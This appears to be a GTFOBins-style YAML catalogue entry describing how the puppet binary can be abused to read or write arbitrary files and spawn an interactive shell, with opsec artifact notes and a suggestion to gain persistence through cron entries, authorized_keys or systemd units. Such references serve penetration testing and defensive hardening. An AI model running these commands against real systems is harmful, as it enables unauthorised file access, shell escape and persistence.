---
name: puppet
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: puppet filebucket -l diff /dev/null /path/to/input-file
  notes: The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: 'puppet apply -e ''file { "/path/to/output-file": content => "DATA" }'''
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'puppet apply -e "exec { ''/bin/sh <$(tty) >$(tty) 2>$(tty)'': }"'
references:
- https://gtfobins.github.io/gtfobins/puppet/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
